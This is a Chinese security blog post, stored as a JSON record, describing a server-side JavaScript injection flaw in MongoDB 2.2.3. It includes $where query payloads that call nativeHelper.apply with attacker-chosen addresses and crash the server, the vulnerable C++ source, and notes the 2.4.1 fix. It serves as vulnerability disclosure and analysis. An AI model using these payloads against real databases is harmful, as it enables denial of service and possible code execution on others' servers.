{"gid":"200","title":"MongoDB\u670d\u52a1\u5668\u7aef\u7684JavaScript\u6ce8\u5165","date":"1428876000","content":"\r\n <div> \r\n <h2 style='background-color:rgb(255, 255, 255);color:rgb(51, 51, 51);font-family:\u5fae\u8f6f\u96c5\u9ed1;font-size:30px;font-style:normal;font-weight:bold;text-align:start;'><\/h2> \r\n <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:\u5fae\u8f6f\u96c5\u9ed1;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'><strong style='font-weight:700;'><span style='color:rgb(0, 153, 0);'>\u5b89\u5168\u7814\u7a76\u8005agixid\u5728MongoDB\u6570\u636e\u5e932.2.3\u7248\u672c\u4e0a\u53d1\u73b0\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\uff0c\u5e76\u4e14\u8868\u793aMetasploit\u5229\u7528payload\u6b63\u5728\u5f00\u53d1\u5f53\u4e2d\u3002\u8be5\u6f0f\u6d1e\u4e3b\u8981\u662fMongoDB\u4e0d\u6b63\u786e\u7684\u4f7f\u7528SpiderMonkey&nbsp; Javascript\u7684NativeHelper\u51fd\u6570\uff0c\u5bfc\u81f4\u53ef\u4ee5\u6ce8\u5165\u4ee3\u7801\u6216\u7f13\u51b2\u533a\u6ea2\u51fa\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002<\/span><\/strong><\/p> \r\n <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:\u5fae\u8f6f\u96c5\u9ed1;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'><strong style='font-weight:700;'>\u4ee5\u4e0b\u4e3a\u7814\u7a76\u8005\u5e26\u6765\u7684\u4e00\u4e9b\u5206\u6790\u3002<\/strong><\/p> \r\n <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:\u5fae\u8f6f\u96c5\u9ed1;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>\u9996\u5148\u5728MongoDB\u4e2d\u5c1d\u8bd5\u4e00\u4e9b\u670d\u52a1\u5668\u7aef\u7684JavaScript\u6ce8\u5165\uff0c\u5c1d\u8bd5\u8fd0\u884c\u4e00\u4e2ashell\u3002<\/p> \r\n <pre style='background-color:rgb(247, 247, 249);color:rgb(51, 51, 51);font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(72, 72, 76);'>&gt; run('uname','-a')\r\nSun Mar 25 07:09:49 shell: started program\r\nsh1838| Linux mongo 2.6.32-5-686 #1 SMP Sun Sep 23 09:49:36 UTC 2012 i686 GNU\/Linux\r\n0<\/span><\/pre> \r\n <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:\u5fae\u8f6f\u96c5\u9ed1;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>\u4ee5\u4e0b\u8fd9\u4e2a\u547d\u4ee4\u53ea\u80fd\u5728mongo\u5ba2\u6237\u7aef\u624d\u6709\u6548<\/p> \r\n <pre style='background-color:rgb(247, 247, 249);color:rgb(51, 51, 51);font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(72, 72, 76);'>&gt; db.my_collection.find({$where:'run('ls')'})\r\nerror: {\r\n '$err' : 'error on invocation of $where function:\\nJS Error: ReferenceError: run is not defined nofile_a:0',\r\n 'code' : 10071\r\n}<\/span><\/pre> \r\n <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:\u5fae\u8f6f\u96c5\u9ed1;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>\u7814\u7a76\u8005\u7ee7\u7eed\u6df1\u5165\u5c1d\u8bd5<\/p> \r\n <pre style='background-color:rgb(247, 247, 249);color:rgb(51, 51, 51);font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(72, 72, 76);'>&gt; run\r\nfunction () {\r\n    return nativeHelper.apply(run_, arguments);\r\n}<\/span><\/pre> \r\n <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:\u5fae\u8f6f\u96c5\u9ed1;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>\u8fd0\u884c&lt;run&gt;\u51fd\u6570\uff0c\u5728\u670d\u52a1\u7aef\u76f4\u63a5\u8c03\u7528 nativeHelper.apply(run_,['uname','-a']); \uff0c\u8fd4\u56de\u4fe1\u606f\u63d0\u793anativeHelper.apply\u65b9\u6cd5\u5b58\u5728\u3002<\/p> \r\n <pre style='background-color:rgb(247, 247, 249);color:rgb(51, 51, 51);font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(72, 72, 76);'>&gt; db.my_collection.find({$where:'nativeHelper.apply(run_, ['uname','-a']);'})\r\nerror: {\r\n\t'$err' : 'error on invocation of $where function:\\nJS Error: ReferenceError: run_ is not defined nofile_a:0',\r\n\t'code' : 10071\r\n}<\/span><\/pre> \r\n <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:\u5fae\u8f6f\u96c5\u9ed1;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>\u5c06\u4e00\u4e2a\u5173\u8054\u6570\u7ec4\u7528\u5230\u670d\u52a1\u5668\u7aef<\/p> \r\n <pre style='background-color:rgb(247, 247, 249);color:rgb(51, 51, 51);font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(72, 72, 76);'>&gt; db.my_collection.find({$where:'nativeHelper.apply({'x':135246144}, ['uname','-a']);'})\r\nSun Mar 25 07:15:26 DBClientCursor::init call() failed\r\nSun Mar 25 07:15:26 query failed : sthack.my_collection { $where: 'nativeHelper.apply({'x':135246144}, ['uname','-a']);' } to: 127.0.0.1:27017\r\nError: error doing query: failed\r\nSun Mar 25 07:15:26 trying reconnect to 127.0.0.1:27017\r\nSun Mar 25 07:15:26 reconnect 127.0.0.1:27017 failed couldn't connect to server 127.0.0.1:27017<\/span><\/pre> \r\n <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:\u5fae\u8f6f\u96c5\u9ed1;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>\u7ed3\u679c\u663e\u793a\uff1aThe server crashed \\o\/ ! \uff08\u5d29\u6e83\uff09<\/p> \r\n <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:\u5fae\u8f6f\u96c5\u9ed1;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>\u67e5\u770b\u770b\u4e00\u4e0b\u5176\u6e90\u4ee3\u7801<\/p> \r\n <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:\u5fae\u8f6f\u96c5\u9ed1;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>\u8def\u5f84\uff1a.\/src\/mongo\/scripting\/engine_spidermonkey.cpp<\/p> \r\n <pre style='background-color:rgb(247, 247, 249);color:rgb(51, 51, 51);font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(72, 72, 76);'>JSBool native_helper( JSContext *cx , JSObject *obj , uintN argc, jsval *argv , jsval *rval ) {\r\n        try {\r\n            Convertor c(cx);\r\n            NativeFunction func = reinterpret_cast(\r\n                    static_cast( c.getNumber( obj , 'x' ) ) );\r\n            void* data = reinterpret_cast<\/span><span>&lt;void<\/span><span style='color:rgb(72, 72, 76);'>*<\/span><span>&gt;<\/span><span style='color:rgb(72, 72, 76);'>(\r\n                    static_cast( c.getNumber( obj , 'y' ) ) );\r\n            verify( func );\r\n\r\n            BSONObj a;\r\n            if ( argc &gt; 0 ) {\r\n                BSONObjBuilder args;\r\n                for ( uintN i = 0; i &lt; argc; ++i ) {\r\n                    c.append( args , args.numStr( i ) , argv[i] );\r\n                }\r\n                a = args.obj();\r\n            }\r\n\r\n            BSONObj out;\r\n            try {\r\n                out = func( a, data );\r\n            }\r\n            catch ( std::exception&amp; e ) {<\/span><\/pre> \r\n <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:\u5fae\u8f6f\u96c5\u9ed1;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>\u539f\u51fd\u6570\u7684\u529f\u80fd\u4f1a\u4ece\u201dx\u201d : 135246144\u8c03\u7528\u81f3JavaScript\u5bf9\u8c61\u4e0d\u5e26\u4efb\u4f55\u68c0\u67e5\u3002<\/p> \r\n <pre style='background-color:rgb(247, 247, 249);color:rgb(51, 51, 51);font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(72, 72, 76);'>&gt; db.my_collection.find({$where:'nativeHelper.apply({'x':0x31337}, ['uname','-a']);'})\r\n\r\nSun Mar 25 07:20:03 Invalid access at address: 0x31337 from thread: conn1\r\nSun Mar 25 07:20:03 Got signal: 11 (Segmentation fault).<\/span><\/pre> \r\n <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:\u5fae\u8f6f\u96c5\u9ed1;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>MongoDB\u5df2\u53d1\u5e03\u6700\u65b0\u7248\u672c2.4.1\u4fee\u590d\u4e86\u8be5\u6f0f\u6d1e\uff0c<a href='http:\/\/www.mongodb.org\/downloads' target='_blank' style='background-color:0px 0px;color:rgb(6, 154, 239);'>\u4e0b\u8f7d\u5730\u5740<\/a><\/p> \r\n <br> \r\n<\/div>\r\n ","excerpt":"\u00a0\u5b89\u5168\u7814\u7a76\u8005agixid\u5728MongoDB\u6570\u636e\u5e932.2.3\u7248\u672c\u4e0a\u53d1\u73b0\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\uff0c\u5e76\u4e14\u8868\u793aMetasploit\u5229\u7528payload\u6b63\u5728\u5f00\u53d1\u5f53\u4e2d\u3002\u8be5\u6f0f\u6d1e\u4e3b\u8981\u662fMongoDB\u4e0d\u6b63\u786e\u7684\u4f7f\u7528SpiderMonkeyJavascript\u7684NativeHelper\u51fd\u6570\uff0c\u5bfc\u81f4\u53ef\u4ee5\u6ce8\u5165\u4ee3\u7801\u6216\u7f13\u51b2\u533a\u6ea2\u51fa\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\u4ee5","author":"1","sortid":"-1","type":"blog","views":"249","comnum":"0","tbcount":"0","attnum":"0","top":"n","hide":"n","allow_remark":"y","allow_tb":"y","password":"","thumb":"0","alias":""}